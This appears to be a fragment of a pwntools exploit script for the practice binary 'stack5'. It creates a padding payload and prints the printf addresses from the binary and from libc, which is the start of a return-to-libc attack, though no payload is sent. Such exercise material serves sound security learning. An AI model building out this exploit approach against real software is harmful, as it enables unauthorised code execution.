from pwn import *

payload = 'A'*20

elf = ELF('stack5')
p = process('./stack5')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
print hex(elf.sym['printf'])
print hex(libc.sym['printf'])
